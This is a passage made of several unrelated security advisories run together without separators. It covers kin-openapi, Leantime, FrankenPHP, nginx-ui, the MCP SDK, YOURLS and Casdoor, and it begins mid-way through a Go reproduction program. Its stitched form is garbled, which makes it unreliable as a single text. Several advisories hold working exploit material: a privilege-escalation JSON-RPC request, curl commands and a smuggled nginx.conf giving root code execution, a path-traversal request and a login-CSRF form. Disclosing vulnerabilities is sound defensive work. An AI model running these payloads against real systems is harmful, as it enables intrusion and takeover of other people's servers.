	"strings"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const spec = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

func main() {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(spec))
	if err != nil {
		log.Fatal(err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		log.Fatalf("doc.Validate rejected (unexpected for 3.1): %v", err)
	}
	fmt.Println("SPEC_ACCEPTED; Items ==", doc.Paths.Value("/f").Post.RequestBody.Value.
		Content.Get("application/x-www-form-urlencoded").Schema.Value.Properties["tags"].Value.Items)

	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		log.Fatal(err)
	}

	req, _ := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=a"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	route, pp, _ := router.FindRoute(req)
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("DIRECT_PANIC: %v\n", r)
			}
		}()
```

### Impact

- **Type:** NULL Pointer Dereference → **unauthenticated remote denial of service**.
- **Who is impacted:** applications using `github.com/getkin/kin-openapi/openapi3filter` to validate requests/responses against OpenAPI **3.1** documents that contain an `items`-less `type: array` in a urlencoded or multipart body property, or an array-typed response header (or other `parseArray` surfaces). Specs may be author mistakes, codegen output, or attacker-supplied where untrusted documents are loaded — `doc.Validate()` does **not** reject them under 3.1.
- **Attack:** a single unauthenticated POST (or response-validation hit) with a tiny non-empty body.
- **Consequence:** deterministic panic on every request to the operation. With stock `net/http`, the server logs `http: panic serving` and aborts the connection; without per-request recover (common outside pure `net/http` handlers), the process can crash.
- **Not affected:** OpenAPI 3.0 documents (spec validation rejects missing `items`); JSON request bodies (different decoder path that does not hit this `Items.Value` inspection).

### Summary

Any authenticated Leantime user - including the lowest-privilege `readonly` role - can escalate to full administrative access by calling the JSON-RPC method `leantime.rpc.api.api.createApiKeyWithProjects` with an attacker-chosen `role` value. The server creates a new account at that role with no authorization check, and the resulting credentials work as a fully interactive admin login through the ordinary web UI. The same root cause (missing per-method authorization on JSON-RPC-exposed service methods) also leaves the `Plugins` service's `installPlugin`, `enablePlugin`, `disablePlugin`, and `removePlugin` methods callable by any authenticated user with no role check, even though their web-UI equivalents correctly require an admin/owner role.

### Details

Leantime's JSON-RPC API (`app/Domain/Api/Controllers/Jsonrpc.php`) reflects any public method on any `@api`-annotated service class and dispatches it at `leantime.rpc.{domain}.{service}.{method}`. Per-method authorization is enforced by `PermissionEnforcer::enforce()` (`app/Core/Auth/Permissions/PermissionEnforcer.php`), which reads a `#[RequiresPermission(...)]` PHP attribute off the target method - but when that attribute is **absent**, `enforce()` silently returns and allows the call through.

`Api::createApiKeyWithProjects(array $values, ?array $projects)` (`app/Domain/Api/Services/Api.php`) is `@api`-exposed and carries no `#[RequiresPermission]` attribute. It forwards `$values` - including a caller-supplied `role` - directly into `createAPIKey()` → `Users\Repositories\Users::addUser()`, with no server-side clamping of `role` against the calling user's own privilege level:

```php
// app/Domain/Api/Services/Api.php
/**
 * @api
 */
public function createApiKeyWithProjects(array $values, ?array $projects): array|false
{
    $apiKeyValues = $this->createAPIKey($values);   // no #[RequiresPermission], no role check
    ...
}
```

The equivalent web route (`NewApiKey` controller) correctly gates account creation behind an admin-only role check (`Auth::authOrRedirect([Roles::$admin, ...])`), but that gate is bypassed entirely by calling the service directly through JSON-RPC.

Separately, `Plugins::installPlugin()`, `enablePlugin()`, `disablePlugin()`, and `removePlugin()` (`app/Domain/Plugins/Services/Plugins.php`, lines ~266/299/320/342) share the same gap: all four are `@api`-exposed with no `#[RequiresPermission]`, while their web-controller equivalents (`Myapps.php`, `Details.php`) correctly require `Roles::$owner`/`Roles::$admin`.

Authenticating to the JSON-RPC endpoint with an ordinary browser session cookie (rather than a dedicated API key) is sufficient, provided the request carries an `X-Requested-With: XMLHttpRequest` header (`app/Core/Middleware/StartSession.php`) - this is exactly what the application's own first-party JS client already sends, so no special tooling beyond a normal authenticated session is needed.

### PoC

A runnable Python PoC (`requests` library only) reproduces this end-to-end; see the attached `poc.py`. Steps:

1. Create/authenticate as a `readonly`-role account (the lowest privilege level). Confirm it is correctly blocked (HTTP 403) from an admin-only page, e.g. `/plugins/myapps`.
2. From that same low-privilege session, send:
   ```
   POST /api/jsonrpc
   Content-Type: application/json
   X-Requested-With: XMLHttpRequest

   {"jsonrpc":"2.0","id":1,"method":"leantime.rpc.api.api.createApiKeyWithProjects",
    "params":{"values":{"firstname":"poc","role":40,"status":"a"},"projects":[]}}
   ```
   The server responds `HTTP 200` with the newly created account's `user`/`passwordClean` and `"role":40` (admin) in the JSON body.
3. Log in through the normal `/auth/login` form using the returned `user`/`passwordClean`. The resulting session now has full, interactive access to `/plugins/myapps` (HTTP 200) - the exact page that returned 403 in step 1.

Reproduced against a local instance built from this repository's own `.dev` Docker tooling (`.dev/docker-compose.yaml`), with dependencies installed via `composer install` / `npx mix` and no modifications to application code.

### Impact

Complete compromise of any Leantime instance by an attacker who controls, or can register/be granted, any authenticated account - including the lowest-privilege `readonly` role. No admin credentials, tokens, or prior access beyond an ordinary low-privilege login are required. This is a full authenticated-to-admin privilege escalation (CWE-862 Missing Authorization, CWE-269 Improper Privilege Management). Combined with the plugin-management gap described above, it further extends to arbitrary plugin install/enable/disable/remove, a path toward code-execution-level impact tracked from the same root cause.

## Summary
In worker mode under concurrency, FrankenPHP can hand a PHP session id from one request to another when PHP's `session` extension is loaded as a shared module instead of being statically linked into the FrankenPHP binary. A request presenting `Cookie: session=A` can have `session_id()` resolve to `B` (a different concurrent client's id) or to a stale id from a previous request served by the same worker thread.

## Impact
- **Security:** cross-user session exposure / session hijacking in worker mode. Same impact class as CVE-2026-24894.
- **Functional:** users are intermittently logged out; their cookie's session is ignored and they receive a foreign or empty session.

## Affected / not affected
Exposure is determined by how the `session` extension is linked in the PHP build FrankenPHP is compiled against, **not** by the FrankenPHP release:

- **Affected:** any build where the `session` extension is not visible to FrankenPHP at compile time, i.e. loaded as a shared / out-of-tree module (`extension=session` in an ini). This includes the RPM and Debian packages and other packaged `php-zts` distributions that ship `session` as a shared extension under `conf.d`.
- **Not affected:** builds where `session` is statically compiled into the PHP that FrankenPHP links against, such as the official static binaries and Docker images. There, the reset code below is compiled in and clears the id every request.

The C session-reset code is unchanged across 1.11.x-1.12.x, so this is not a code regression between releases. A "1.12.2 works / 1.12.3 leaks" observation on the same host reflects two differently-built packages, not a source change. The persistent-zval helpers (#2366) are compiled only under `FRANKENPHP_TEST` and are unrelated.

## Root cause
FrankenPHP resets per-request session state in `frankenphp_reset_session_state()`, which releases `PS(id)` so the next `session_start()` re-reads the request cookie. That whole function is guarded by `#ifdef HAVE_PHP_SESSION`, a macro defined only when the session extension headers are present at FrankenPHP compile time (session statically enabled in the PHP build). When `session` is a shared module, `HAVE_PHP_SESSION` is undefined, the reset is compiled out, and `PS(id)` survives the request boundary.

PHP's `session_start()` reads the request cookie only when `PS(id)` is `NULL` (`ext/session/session.c`, `try_find_session_id_in_cookies()`: `if (!PS(use_cookies) || PS(id)) return;`). With a stale `PS(id)`, the cookie is ignored and the worker reuses the previous request's id, exposing it to whichever client is served next.

## Reproduction
Minimal worker script (`index.php`):
```php
<?php
$handler = static function () {
    session_start();
    $sent = $_COOKIE['session'] ?? '(none)';
    $id   = session_id();
    header('Content-Type: text/plain');
    echo ($sent === '(none)' || $sent === $id) ? "OK   sent=$sent id=$id\n"
                                               : "LEAK sent=$sent id=$id\n";
    session_write_close();
};
while (\frankenphp_handle_request($handler)) {}
```
Run under worker mode with `num 2` (≥2 workers), `session.use_strict_mode=1`, on a PHP build where `session` is a shared module. Pre-create two valid sessions `A` and `B`, then fire concurrent requests alternating the two cookies:
```sh
seq 600 | xargs -P32 -I{} sh -c '
  c=$([ $(( {} % 2 )) -eq 0 ] && echo A || echo B);
  curl -s -H "Cookie: session=$c" http://127.0.0.1:8080/' | grep -c LEAK
```
On an affected build a large fraction of responses are `LEAK` (`session_id()` differs from the cookie sent, and `A` and `B` sometimes resolve to the same id). On a statically-linked build the count is always `0`.

## Fix
When `HAVE_PHP_SESSION` is undefined, FrankenPHP now resets the `session` module through the module registry on every worker request (its `RSHUTDOWN` releases `PS(id)`, `RINIT` re-initialises the globals), so the per-request cleanup always runs regardless of how the extension is linked. Statically-linked builds are unchanged and keep using `frankenphp_reset_session_state()`.

Verified on PHP 8.6-dev ZTS, 2 workers, `session.use_strict_mode=1`, 600 alternating-cookie concurrent requests: before the fix 519/600 leaked; after the fix 0/600. Statically-linked builds stayed at 0/600.

## Workarounds
- Use a FrankenPHP build with `session` statically compiled (official static binaries or Docker images).
- Or, in the worker loop, after `session_write_close()` call `session_id('')` so the next `session_start()` re-reads the request cookie (with `session.use_strict_mode=1`).

### Summary

A flaw in the SSH service allows an authenticated client to crash the server by sending a malformed protocol message while opening a channel.

### Impact

Any user able to authenticate over SSH can trigger an unhandled error condition that aborts the server process. This results in a denial of service affecting all connected users until the service is restarted. No confidentiality or integrity impact has been identified; the issue is limited to availability.

### Summary
An OTP-enabled authenticated user who cannot use the HTTP configuration mutation endpoints without a valid secure session can still mutate Nginx configuration through `/mcp` and `/mcp_message` using only ordinary authentication.

### Details
The HTTP configuration mutation surface is explicitly grouped behind `middleware.RequireSecureSession()`. By contrast, the MCP endpoints are exposed with only `middleware.AuthRequired()`. The MCP server exposes configuration mutation tools including `nginx_config_add` and `nginx_config_modify`, so OTP-enabled users gain an alternate path around the intended step-up requirement.

Relevant code paths:
- [api/config/router.go](/home/kali/Desktop/bounty/nginx-ui/api/config/router.go:14)
- [internal/middleware/secure_session.go](/home/kali/Desktop/bounty/nginx-ui/internal/middleware/secure_session.go:52)
- [mcp/router.go](/home/kali/Desktop/bounty/nginx-ui/mcp/router.go:9)
- [mcp/config/config_add.go](/home/kali/Desktop/bounty/nginx-ui/mcp/config/config_add.go:34)
- [mcp/config/config_modify.go](/home/kali/Desktop/bounty/nginx-ui/mcp/config/config_modify.go:55)

This is a security-control bypass rather than a missing feature. The product already established that OTP-enabled users should complete a secure session before high-impact configuration mutations are accepted on the HTTP path.

What the executed test did:
1. Created a temporary config directory and configured Nginx control commands to harmless local values (`true`) to avoid touching the host.
2. Created a real OTP-enabled user in a temporary SQLite database.
3. Generated a real JWT for that OTP-enabled user.
4. Started a local test server exposing the real `/mcp` and `/mcp_message` routes.

- The config file was written through the MCP tool path using only JWT authentication.

OTP-enabled accounts lose the intended step-up protection for high-impact Nginx configuration changes when MCP is enabled. A user who should be blocked until re-authenticating can still create or modify configuration files and trigger reload behavior through MCP.

### Summary
Standalone short tokens issued for WebSocket and explicit-token authentication can survive administrative revocation in cache. If the same account is later re-enabled before the cache entry expires, the deleted short token becomes valid again.

### Details
`GenerateShortToken()` creates an `AuthToken` row that contains only `ShortToken` and no long `Token`. `DeleteUserTokens()` removes database rows, but when clearing caches it only invalidates entries where `authToken.Token != ""`. This leaves standalone short-token cache entries behind. `GetTokenUserByShortToken()` checks that cache first and then loads the user by ID, so the stale short token becomes usable again if the account status is restored to `true`.

Relevant code paths:
- [internal/user/user.go](/home/kali/Desktop/bounty/nginx-ui/internal/user/user.go:43)
- [internal/user/user.go](/home/kali/Desktop/bounty/nginx-ui/internal/user/user.go:118)
- [internal/user/user.go](/home/kali/Desktop/bounty/nginx-ui/internal/user/user.go:204)
- [api/user/short_token.go](/home/kali/Desktop/bounty/nginx-ui/api/user/short_token.go:13)
- [internal/middleware/middleware.go](/home/kali/Desktop/bounty/nginx-ui/internal/middleware/middleware.go:82)

### PoC
This was verfied locally in an isolated environment with a temporary package-level harness that exercised the real token issuance, revocation, cache, and re-authentication paths.

What the executed test did:
1. Created an enabled user in a temporary SQLite database.
2. Called the real `GenerateShortToken(user.ID)` function to issue a standalone short token.
3. Verified that the token authenticated successfully and was present in the short-token cache.
4. Disabled the user and called the real `DeleteUserTokens(user.ID)` function.
5. Verified that the database token rows were removed.
6. Verified that the short-token cache entry still existed after `DeleteUserTokens`.
7. Re-enabled the same user.
8. Reused the previously deleted short token via the real `GetTokenUserByShortToken()` path and observed successful authentication.

Observed result from the actual local verification:
- The database token rows were removed during revocation.
- The short-token cache entry remained present.
- Re-enabling the user restored successful authentication through the stale short token.

### Impact
Any deployment using standalone short tokens is affected. If a short token is stolen, administrative disable/delete-token handling may not fully revoke it. Re-enabling the account within the cache lifetime restores access for the stale token to any HTTP or WebSocket routes that accept short-token authentication.

## Summary
`config.ValidateConfigFile` is the security control that blocks dangerous nginx directives
(`js_*`, `perl_*`, `load_module` of njs/perl modules, `user root`). Its directive scanner is
bypassable: it splits the config by newlines and inspects only the FIRST token of each line, but
nginx separates directives with `;`, not newlines. Putting a benign directive first and the blocked
directive after a `;` on the SAME line defeats every check. The `include` directive is also not on
the denylist. As a result, an authenticated caller can inject the exact directives the hardening was
meant to block, through EVERY path that calls the validator — `POST /api/configs` (add), the REST
config modify endpoint (api/config/modify.go), the MCP `nginx_config_modify` tool, and the
site/stream save paths (internal/site/save.go, internal/stream/save.go). On deployments where
nginx has the njs/perl module (the official uozi/nginx-ui Docker image ships ngx_http_js_module.so),
this leads to code execution in the nginx worker; with `user root` the workers run as root.

This is distinct from the config_add gap (the MCP nginx_config_add tool not calling the validator at
all): here the validator IS called and still bypassed, so fixing config_add does not fix this.

## Root cause (internal/config/validation.go, ValidateConfigDirectives)
```go
for _, line := range bytes.Split(content, []byte("\n")) {          // splits on \n only
    trimmed := strings.TrimSpace(string(line))
    ...
    directive := firstDirectiveToken(trimmed)                      // first [a-zA-Z_]* of the line
    if directive == "user" && configuresRootWorkers(trimmed) { ... }     // keyed on first token
    if directive == "load_module" && loadsRestrictedDynamicModule(...) { ... } // keyed on first token
    if _, blocked := blockedConfigDirectives[directive]; blocked { ... }      // keyed on first token
}
```
nginx parses `a 1; b 2;` on one line as two directives, but this scanner only ever sees `a`.
`include` is absent from `blockedConfigDirectives`.

## Proof of Concept (live, official image uozi/nginx-ui:2.3.11) — VALIDATED paths only
Authenticated with a node secret (`X-Node-Secret`, from nginx-ui's first-boot log) or a user JWT.
Every step below hits a path that calls ValidateConfigFile.

1) Baseline — validator works on a plain line:
```
curl -X POST http://HOST/api/configs -H "X-Node-Secret: $S" -H 'Content-Type: application/json' \
  -d '{"name":"x.conf","base_dir":"","content":"js_import a.js;","overwrite":true}'
# -> 40017 "file content contains restricted nginx directive: js_import"   (REJECTED)
```

2) Create the njs module file via the VALIDATED REST add (JS source is not nginx directives, so it
   passes ValidateConfigContent):
```
poc.conf:
  import fs from 'fs';
  function pwn(r){ fs.writeFileSync('/tmp/NJS_VIA_DENYLIST_BYPASS.txt','denylist-bypass-rce-ok\n'); r.return(200,'pwned2\n'); }
  export default { pwn };
curl -X POST http://HOST/api/configs -H "X-Node-Secret: $S" -H 'Content-Type: application/json' \
  -d '{"name":"poc.conf","base_dir":"","content":"<the JS above>","overwrite":true}'   # ACCEPTED
```

3) Overwrite the main nginx.conf via the VALIDATED `nginx_config_modify` MCP tool, smuggling each
   blocked directive after a benign one on the SAME line (this is ACCEPTED by ValidateConfigFile):
```nginx
worker_processes 1; load_module /usr/lib/nginx/modules/ngx_http_js_module.so;
error_log /var/log/nginx/error.log notice; user root;
pid /run/nginx.pid;
events { worker_connections 1024; }
http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream; js_import poc from /etc/nginx/poc.conf;
    server { listen 8897; location = /pwn3 { js_content poc.pwn; } }
}
```

4) Reload. Result:
- `nginx -t` successful.
- worker `/proc/<pid>/status` → `Uid: 0 0 0 0` (root) — the blocked `user root` took effect.
- `GET http://127.0.0.1:8897/pwn3` → `pwned2` — js_content executed.
- `/tmp/NJS_VIA_DENYLIST_BYPASS.txt` created, owned by root → njs code execution as root.

(An MCP-over-SSE client for steps using nginx_config_modify is included in the config_add report as
`poc_mcp_client.py`; the same client drives this PoC. `X-Node-Secret` authenticates both REST and MCP.)

## Impact
Authenticated config-injection that defeats the directive-validation control on all guarded write
paths. On deployments with njs/perl available (the official Docker image ships ngx_http_js_module.so):
code execution in the nginx worker and, via `user root`, arbitrary file read/write as root (trivially
escalated to full host compromise). On stock nginx without those modules: reliable DoS (failed
reload) plus `user root` privilege regression.

## Honest scope / caveats
- Authenticated (node secret or user JWT), agent-mediated — not unauthenticated.
- What was live-verified: the bypass + full RCE on `POST /api/configs` (add) and the MCP
  `nginx_config_modify` tool. The other callers — REST config modify (api/config/modify.go), site
  save (internal/site/save.go), stream save (internal/stream/save.go) — invoke the SAME
  `ValidateConfigFile` (code-confirmed), so they are affected by construction; I did not individually
  live-test each.
- RCE is conditional on the njs/perl module being present; it ships in the official image, so the
  default Docker deployment is exploitable. On stock nginx without those modules the injected
  `load_module`/`js_*` make reload fail → DoS plus a `user root` privilege regression (inferred from
  nginx module behavior; not separately tested on a stock build).
- The `;` and `include` bypasses are fully confirmed live. A backslash line-continuation variant was
  accepted by the validator but its nginx parsing was not separately confirmed and is not relied on.
- "Full host compromise" describes the capability of root file read/write via njs `fs` (proven: a
  root-owned file was written); the subsequent authorized_keys/cron step is a well-known escalation,
  not something this PoC executed.

## Suggested fix
Do not hand-roll a newline/first-token denylist. Validate the way nginx parses: split statements on
`;` (and handle blocks, comments, line continuations), validate EVERY statement, block/limit
`include`, and recurse into included files — or validate via an allowlist and/or by running
`nginx -t` on the candidate before activating it.

## Dedup / novelty
Distinct from CVE-2026-33032 (unauthenticated MCP endpoint — an auth issue, now fixed) and from the
separately reported config_add validation gap (a missing validator call on one path). This is a
bypass of the validator itself, affecting every path that calls it; no existing CVE/GHSA covers it
(checked osv.dev and the GitHub advisory database for this repo). Appears novel.

### Summary
In affected versions, a Streamable HTTP server in stateful mode (the default) never reclaimed session state:

- sessions did not expire;
- a client `DELETE` ended the session but left its entry registered;
- a session whose first request was refused stayed registered with a running task.

Each session also kept its parsed `initialize` parameters, and the number of sessions was unlimited. A client that could reach the endpoint could grow server memory without bound using ordinary short requests; only a restart reclaimed it.

### Am I affected?
Yes, if you serve MCP over Streamable HTTP in stateful mode and clients you do not fully trust can reach the endpoint. Stateful mode is the default for:

- `FastMCP` (1.x)
- `MCPServer` and `Server.streamable_http_app()` (2.x)
- `StreamableHTTPSessionManager`

Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.

Not affected:

- servers on 1.12.0 or later passing `stateless_http=True` (no sessions are kept)
- servers using only the stdio or SSE transports

Authentication limits who can open sessions, not how many a token holder can open.

### Fix
Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. In those versions:

- a session with no request in flight for `session_idle_timeout` seconds (default 1800) is closed and its ID then answers `404`; open streams and in-progress requests keep it alive;
- at most `max_sessions` sessions exist at once (default 10000); a request that would open another is answered `503`;
- a session is discarded as soon as it ends, whether by `DELETE`, expiry, or a refused opening request.

Both settings are keyword arguments on `FastMCP(...)` (1.x), `MCPServer.run()` / `streamable_http_app()` (2.x) and `StreamableHTTPSessionManager`; `None` disables them.

This bounds retention rather than eliminating it: a live session still holds its `initialize` parameters (up to roughly twice the 4 MiB body limit), and an `initialize` with invalid parameters still opens a session that expires like any other. On a small host, lower `session_idle_timeout`, `max_sessions` and `max_request_body_size` to fit.

If you cannot upgrade yet, pass `stateless_http=True` (1.12.0 or later) where you need no per-session state, or restrict who can reach the endpoint.

## Summary YOURLS versions ≤1.10.4 contain an unauthenticated path traversal vulnerability that allows attackers to include and execute arbitrary PHP files on the server without any credentials. ## Details The vulnerability exists because YOURLS uses **URL sanitization functions** (`yourls_sanitize_url()`, `yourls_esc_url()`) to filter request paths, but these functions are designed to clean URLs, not filesystem paths. They preserve `/` and `.` characters, allowing `../` sequences to pass through unfiltered. The unsanitized keyword is then directly concatenated into a filesystem path and passed to `file_exists()` and later `include()` operations, enabling path traversal attacks. **Data Flow:** ``` HTTP Request URI (with ../) ↓ yourls_get_request() (no sanitization) ↓ yourls_sanitize_url() (preserves / and .) ↓ yourls_esc_url() (permits / and . via regex) ↓ Keyword extraction (preserves ../) ↓ file_exists(YOURLS_PAGEDIR . "/$keyword.php") ← Sink ↓ include(YOURLS_PAGEDIR . "/$keyword.php") ← Code Execution ``` ## Proof of Concept (POC) In the concept validation, we assume that the attacker has uploaded a `test.php` file to the web root directory, but it cannot be accessed directly. (Of course, it could also be any path, such as `/tmp/test.php`) ### Setup Place a test file in web root: `./test.php`: ```php ``` ### Attack Request ```http GET /../../test HTTP/1.1 Host: target.com Connection: close ``` ### Response (Apache Environment) ## Impact 1. Remote execution of uploaded PHP files – An attacker uploads a malicious PHP file to an arbitrary location on the server (e.g., via another vulnerability or file upload feature), obtains its absolute path but cannot access it directly. The attacker then leverages this vulnerability to include and execute the PHP file, gaining code execution privileges. 2. Indirect triggering of PHP code injection – If a PHP code injection point exists on the system (e.g., log injection, session injection) but the injected file cannot be accessed directly due to configuration restrictions, the attacker can use this vulnerability to include and execute the injected code, achieving remote command execution or further compromise.

## Summary

In the Casdoor SSO flow, the OAuth `state` parameter is hard-coded to `settings.CasdoorSettings.Application` — a value identical for every user and every login. The callback handler accepts whatever `state` the client sends without comparing it to anything stored in the user agent, enabling a login-CSRF: an attacker can force the victim's browser to authenticate as the *attacker*.

## Details

`api/user/casdoor.go:92-117` (`GetCasdoorUri`):

```go
func GetCasdoorUri(c *gin.Context) {
    clientId := settings.CasdoorSettings.ClientId
    redirectUri := settings.CasdoorSettings.RedirectUri
    state := settings.CasdoorSettings.Application      // ← constant
    ...
    c.JSON(http.StatusOK, gin.H{
        "uri": fmt.Sprintf(
            "%s/login/oauth/authorize?client_id=%s&response_type=code&redirect_uri=%s&state=%s&scope=read",
            endpoint, clientId, encodedRedirectUri, state),
    })
}
```

`api/user/casdoor.go:24-90` (`CasdoorCallback`):

```go
type CasdoorLoginUser struct {
    Code  string `json:"code" binding:"required,max=255"`
    State string `json:"state" binding:"required,max=255"`
}

func CasdoorCallback(c *gin.Context) {
    var loginUser CasdoorLoginUser
    if !cosy.BindAndValid(c, &loginUser) { return }
    ...
    // state is NEVER compared to a per-session value
    token, err := casdoorsdk.GetOAuthToken(loginUser.Code, loginUser.State)
    ...
    u, err := user.GetUser(claims.Name)        // username from Casdoor's JWT
    ...
    userToken, err := user.GenerateJWT(u)       // JWT minted for whatever user came back
}
```

Compare with the OIDC implementation in `api/user/oidc.go:35-48`, which generates a random state, stores it in an `oidc_state` cookie, and validates it on the callback. Casdoor has no such check.

## Proof of Concept

1. Attacker initiates a Casdoor authorisation flow on their own browser, obtaining an authorisation `code` for *their* Casdoor account.
2. Attacker hosts a page that auto-submits the captured `code` to the victim's nginx-ui:

   ```html
   <html><body><form action="https://victim.example/api/casdoor_callback" method="POST"
                     enctype="text/plain" id="x">
     <input name='{"code":"<attacker_code>","state":"<App>","junk":"' value='"}'>
   </form>
   <script>document.getElementById('x').submit()</script>
   </body></html>
   ```

3. Server exchanges the attacker's `code`, looks up the username from `claims.Name` in the local user table, and mints a JWT for *that* row. The callback also sets the `_nginx_ui_secure_session` cookie via `middleware.EnsureSecureSessionCookie(c)` (`casdoor.go:84`) — meaning the victim is now silently authenticated as the attacker.
4. Victim, believing they are using their own account, configures sites / TLS keys; the attacker reads them.

## Impact

Login CSRF — the victim is forced to authenticate as the attacker, leading to data exfiltration of anything the victim subsequently uploads or configures. Particularly dangerous when nginx-ui is used by an organisation where Casdoor maps internal identities — the attacker can attribute their changes to the victim.

## Patches

Mirror the OIDC implementation:

```diff
+ import (
+    "crypto/rand"
+    "crypto/subtle"
+    "encoding/hex"
+    ...
+ )

 func GetCasdoorUri(c *gin.Context) {
     ...
-    state := settings.CasdoorSettings.Application
+    b := make([]byte, 16)
+    if _, err := rand.Read(b); err != nil {
+        cosy.ErrHandler(c, err); return
+    }
+    state := hex.EncodeToString(b)
+    c.SetSameSite(http.SameSiteLaxMode)
+    c.SetCookie("casdoor_state", state, 600, "/", "",
+                cSettings.ServerSettings.EnableHTTPS, true)
     ...
 }

 func CasdoorCallback(c *gin.Context) {
+    expected, err := c.Cookie("casdoor_state")
+    if err != nil {
+        c.AbortWithStatusJSON(http.StatusBadRequest,
+            gin.H{"message":"missing state cookie"}); return
+    }
     var loginUser CasdoorLoginUser
     if !cosy.BindAndValid(c, &loginUser) { return }
+    if subtle.ConstantTimeCompare([]byte(expected), []byte(loginUser.State)) != 1 {
+        c.AbortWithStatusJSON(http.StatusBadRequest,
+            gin.H{"message":"invalid state"}); return
+    }
     ...
 }
```

## Workarounds

Disable Casdoor SSO until patched. The OIDC integration in `api/user/oidc.go` is correctly implemented and can be used as a substitute.

## References

* [`api/user/casdoor.go:92-117`](https://github.com/0xJacky/nginx-ui/blob/dev/api/user/casdoor.go#L92-L117)
* [`api/user/casdoor.go:24-90`](https://github.com/0xJacky/nginx-ui/blob/dev/api/user/casdoor.go#L24-L90)
* [`api/user/oidc.go:35-48`](https://github.com/0xJacky/nginx-ui/blob/dev/api/user/oidc.go#L35-L48) (correct implementation for comparison)
